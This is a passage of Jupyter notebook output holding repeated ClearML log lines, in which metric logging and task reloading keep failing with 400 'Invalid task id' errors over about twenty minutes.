      "2024-06-14 03:37:49,057 - clearml.Metrics - ERROR - Action failed <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=9)>\n",
      "2024-06-14 03:37:50,544 - clearml.Task - ERROR - Action failed <400/101: tasks.get_by_id/v1.0 (Invalid task id: id=de637ff757e6401a9b9dfa187a230e38, company=d1bd92a3b039400cbafc60a7a5b1e52b)> (task=de637ff757e6401a9b9dfa187a230e38)\n",
      "2024-06-14 03:37:50,545 - clearml.Task - ERROR - Failed reloading task de637ff757e6401a9b9dfa187a230e38\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:37:50,549 - clearml.log - WARNING - failed logging task to backend (1 lines, <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=1)>)\n",
      "2024-06-14 03:37:53,097 - clearml.log - WARNING - failed logging task to backend (1 lines, <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=1)>)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:38:19,358 - clearml.Metrics - ERROR - Action failed <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=9)>\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:38:21,818 - clearml.log - WARNING - failed logging task to backend (1 lines, <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=1)>)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:38:49,697 - clearml.Metrics - ERROR - Action failed <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=9)>\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:38:50,378 - clearml.log - WARNING - failed logging task to backend (1 lines, <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=1)>)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:39:20,164 - clearml.Metrics - ERROR - Action failed <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=9)>\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:39:20,918 - clearml.log - WARNING - failed logging task to backend (1 lines, <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=1)>)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:39:50,935 - clearml.Metrics - ERROR - Action failed <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=9)>\n",
      "2024-06-14 03:39:51,535 - clearml.Task - ERROR - Action failed <400/101: tasks.get_by_id/v1.0 (Invalid task id: id=de637ff757e6401a9b9dfa187a230e38, company=d1bd92a3b039400cbafc60a7a5b1e52b)> (task=de637ff757e6401a9b9dfa187a230e38)\n",
      "2024-06-14 03:39:51,537 - clearml.Task - ERROR - Failed reloading task de637ff757e6401a9b9dfa187a230e38\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:39:53,475 - clearml.log - WARNING - failed logging task to backend (1 lines, <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=1)>)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:40:21,746 - clearml.Metrics - ERROR - Action failed <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=9)>\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:40:23,795 - clearml.log - WARNING - failed logging task to backend (1 lines, <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=1)>)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:40:52,214 - clearml.Metrics - ERROR - Action failed <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=9)>\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:40:54,225 - clearml.log - WARNING - failed logging task to backend (1 lines, <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=1)>)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:41:22,866 - clearml.Metrics - ERROR - Action failed <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=9)>\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:41:25,271 - clearml.log - WARNING - failed logging task to backend (1 lines, <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=1)>)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:41:48,988 - clearml.Metrics - ERROR - Action failed <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=6)>\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:41:49,906 - clearml.log - WARNING - failed logging task to backend (1 lines, <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=1)>)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:41:52,786 - clearml.Task - ERROR - Action failed <400/101: tasks.get_by_id/v1.0 (Invalid task id: id=de637ff757e6401a9b9dfa187a230e38, company=d1bd92a3b039400cbafc60a7a5b1e52b)> (task=de637ff757e6401a9b9dfa187a230e38)\n",
      "2024-06-14 03:41:52,790 - clearml.Task - ERROR - Failed reloading task de637ff757e6401a9b9dfa187a230e38\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:41:54,327 - clearml.log - WARNING - failed logging task to backend (1 lines, <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=1)>)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:41:55,186 - clearml.Metrics - ERROR - Action failed <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=3)>\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:41:56,946 - clearml.log - WARNING - failed logging task to backend (1 lines, <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=1)>)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:42:20,694 - clearml.Metrics - ERROR - Action failed <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=9)>\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:42:21,624 - clearml.log - WARNING - failed logging task to backend (1 lines, <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=1)>)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:42:51,070 - clearml.Metrics - ERROR - Action failed <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=9)>\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:42:52,626 - clearml.log - WARNING - failed logging task to backend (1 lines, <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=1)>)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:43:21,747 - clearml.Metrics - ERROR - Action failed <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=9)>\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:43:23,164 - clearml.log - WARNING - failed logging task to backend (1 lines, <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=1)>)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:43:52,468 - clearml.Metrics - ERROR - Action failed <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=9)>\n",
      "2024-06-14 03:43:53,578 - clearml.Task - ERROR - Action failed <400/101: tasks.get_by_id/v1.0 (Invalid task id: id=de637ff757e6401a9b9dfa187a230e38, company=d1bd92a3b039400cbafc60a7a5b1e52b)> (task=de637ff757e6401a9b9dfa187a230e38)\n",
      "2024-06-14 03:43:53,581 - clearml.Task - ERROR - Failed reloading task de637ff757e6401a9b9dfa187a230e38\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:43:53,898 - clearml.log - WARNING - failed logging task to backend (1 lines, <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=1)>)\n",
      "2024-06-14 03:43:56,786 - clearml.log - WARNING - failed logging task to backend (1 lines, <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=1)>)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:44:22,995 - clearml.Metrics - ERROR - Action failed <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=9)>\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:44:25,469 - clearml.log - WARNING - failed logging task to backend (1 lines, <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=1)>)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:44:53,468 - clearml.Metrics - ERROR - Action failed <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=9)>\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:44:54,218 - clearml.log - WARNING - failed logging task to backend (1 lines, <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=1)>)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:45:23,913 - clearml.Metrics - ERROR - Action failed <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=9)>\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:45:24,951 - clearml.log - WARNING - failed logging task to backend (1 lines, <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=1)>)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:45:54,538 - clearml.Metrics - ERROR - Action failed <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=9)>\n",
      "2024-06-14 03:45:54,749 - clearml.Task - ERROR - Action failed <400/101: tasks.get_by_id/v1.0 (Invalid task id: id=de637ff757e6401a9b9dfa187a230e38, company=d1bd92a3b039400cbafc60a7a5b1e52b)> (task=de637ff757e6401a9b9dfa187a230e38)\n",
      "2024-06-14 03:45:54,752 - clearml.Task - ERROR - Failed reloading task de637ff757e6401a9b9dfa187a230e38\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:45:55,665 - clearml.log - WARNING - failed logging task to backend (1 lines, <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=1)>)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:46:25,106 - clearml.Metrics - ERROR - Action failed <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=9)>\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:46:26,248 - clearml.log - WARNING - failed logging task to backend (1 lines, <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=1)>)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:46:50,677 - clearml.Metrics - ERROR - Action failed <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=9)>\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:46:53,265 - clearml.log - WARNING - failed logging task to backend (1 lines, <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=1)>)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:47:21,745 - clearml.Metrics - ERROR - Action failed <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=7)>\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:47:23,985 - clearml.log - WARNING - failed logging task to backend (1 lines, <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=1)>)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:47:27,543 - clearml.Metrics - ERROR - Action failed <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=2)>\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:47:28,624 - clearml.log - WARNING - failed logging task to backend (1 lines, <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=1)>)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:47:52,935 - clearml.Metrics - ERROR - Action failed <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=9)>\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:47:55,142 - clearml.log - WARNING - failed logging task to backend (1 lines, <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=1)>)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:47:56,302 - clearml.Task - ERROR - Action failed <400/101: tasks.get_by_id/v1.0 (Invalid task id: id=de637ff757e6401a9b9dfa187a230e38, company=d1bd92a3b039400cbafc60a7a5b1e52b)> (task=de637ff757e6401a9b9dfa187a230e38)\n",
      "2024-06-14 03:47:56,306 - clearml.Task - ERROR - Failed reloading task de637ff757e6401a9b9dfa187a230e38\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:47:58,705 - clearml.log - WARNING - failed logging task to backend (1 lines, <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=1)>)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:48:23,535 - clearml.Metrics - ERROR - Action failed <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=9)>\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:48:25,430 - clearml.log - WARNING - failed logging task to backend (1 lines, <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=1)>)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:48:54,065 - clearml.Metrics - ERROR - Action failed <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=9)>\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:48:56,183 - clearml.log - WARNING - failed logging task to backend (1 lines, <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=1)>)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:49:24,781 - clearml.Metrics - ERROR - Action failed <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=9)>\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:49:26,895 - clearml.log - WARNING - failed logging task to backend (1 lines, <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=1)>)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:49:55,345 - clearml.Metrics - ERROR - Action failed <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=9)>\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:49:57,265 - clearml.log - WARNING - failed logging task to backend (1 lines, <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=1)>)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:49:57,295 - clearml.Task - ERROR - Action failed <400/101: tasks.get_by_id/v1.0 (Invalid task id: id=de637ff757e6401a9b9dfa187a230e38, company=d1bd92a3b039400cbafc60a7a5b1e52b)> (task=de637ff757e6401a9b9dfa187a230e38)\n",
      "2024-06-14 03:49:57,297 - clearml.Task - ERROR - Failed reloading task de637ff757e6401a9b9dfa187a230e38\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:49:59,986 - clearml.log - WARNING - failed logging task to backend (1 lines, <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=1)>)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:50:25,905 - clearml.Metrics - ERROR - Action failed <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=9)>\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:50:26,580 - clearml.log - WARNING - failed logging task to backend (1 lines, <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=1)>)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:50:56,785 - clearml.Metrics - ERROR - Action failed <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=9)>\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:50:59,174 - clearml.log - WARNING - failed logging task to backend (1 lines, <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=1)>)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:51:22,377 - clearml.Metrics - ERROR - Action failed <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=9)>\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:51:23,503 - clearml.log - WARNING - failed logging task to backend (1 lines, <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=1)>)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:51:52,879 - clearml.Metrics - ERROR - Action failed <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=9)>\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:51:54,035 - clearml.log - WARNING - failed logging task to backend (1 lines, <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=1)>)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:51:58,183 - clearml.Task - ERROR - Action failed <400/101: tasks.get_by_id/v1.0 (Invalid task id: id=de637ff757e6401a9b9dfa187a230e38, company=d1bd92a3b039400cbafc60a7a5b1e52b)> (task=de637ff757e6401a9b9dfa187a230e38)\n",
      "2024-06-14 03:51:58,186 - clearml.Task - ERROR - Failed reloading task de637ff757e6401a9b9dfa187a230e38\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:52:00,823 - clearml.log - WARNING - failed logging task to backend (1 lines, <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=1)>)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:52:23,354 - clearml.Metrics - ERROR - Action failed <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=9)>\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:52:25,290 - clearml.log - WARNING - failed logging task to backend (1 lines, <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=1)>)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:52:52,673 - clearml.Metrics - ERROR - Action failed <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=8)>\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:52:53,822 - clearml.log - WARNING - failed logging task to backend (1 lines, <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=1)>)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:52:58,000 - clearml.Metrics - ERROR - Action failed <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=1)>\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:53:00,305 - clearml.log - WARNING - failed logging task to backend (1 lines, <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=1)>)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:53:23,664 - clearml.Metrics - ERROR - Action failed <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=9)>\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:53:24,974 - clearml.log - WARNING - failed logging task to backend (1 lines, <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=1)>)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:53:54,225 - clearml.Metrics - ERROR - Action failed <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=9)>\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:53:55,667 - clearml.log - WARNING - failed logging task to backend (1 lines, <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=1)>)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:53:59,114 - clearml.Task - ERROR - Action failed <400/101: tasks.get_by_id/v1.0 (Invalid task id: id=de637ff757e6401a9b9dfa187a230e38, company=d1bd92a3b039400cbafc60a7a5b1e52b)> (task=de637ff757e6401a9b9dfa187a230e38)\n",
      "2024-06-14 03:53:59,119 - clearml.Task - ERROR - Failed reloading task de637ff757e6401a9b9dfa187a230e38\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:54:00,368 - clearml.log - WARNING - failed logging task to backend (1 lines, <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=1)>)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:54:25,007 - clearml.Metrics - ERROR - Action failed <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=9)>\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:54:26,862 - clearml.log - WARNING - failed logging task to backend (1 lines, <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=1)>)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:54:55,409 - clearml.Metrics - ERROR - Action failed <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=9)>\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:54:57,363 - clearml.log - WARNING - failed logging task to backend (1 lines, <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=1)>)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:55:26,231 - clearml.Metrics - ERROR - Action failed <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=9)>\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:55:28,054 - clearml.log - WARNING - failed logging task to backend (1 lines, <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=1)>)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:55:57,159 - clearml.Metrics - ERROR - Action failed <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=9)>\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:55:58,683 - clearml.log - WARNING - failed logging task to backend (1 lines, <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=1)>)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:56:00,208 - clearml.Task - ERROR - Action failed <400/101: tasks.get_by_id/v1.0 (Invalid task id: id=de637ff757e6401a9b9dfa187a230e38, company=d1bd92a3b039400cbafc60a7a5b1e52b)> (task=de637ff757e6401a9b9dfa187a230e38)\n",
      "2024-06-14 03:56:00,212 - clearml.Task - ERROR - Failed reloading task de637ff757e6401a9b9dfa187a230e38\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:56:01,647 - clearml.log - WARNING - failed logging task to backend (1 lines, <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=1)>)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:56:27,886 - clearml.Metrics - ERROR - Action failed <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=9)>\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:56:30,439 - clearml.log - WARNING - failed logging task to backend (1 lines, <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=1)>)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:56:58,927 - clearml.Metrics - ERROR - Action failed <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=9)>\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:57:01,172 - clearml.log - WARNING - failed logging task to backend (1 lines, <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=1)>)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:57:29,647 - clearml.Metrics - ERROR - Action failed <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=9)>\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:57:31,583 - clearml.log - WARNING - failed logging task to backend (1 lines, <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=1)>)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:58:00,083 - clearml.Metrics - ERROR - Action failed <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=9)>\n",
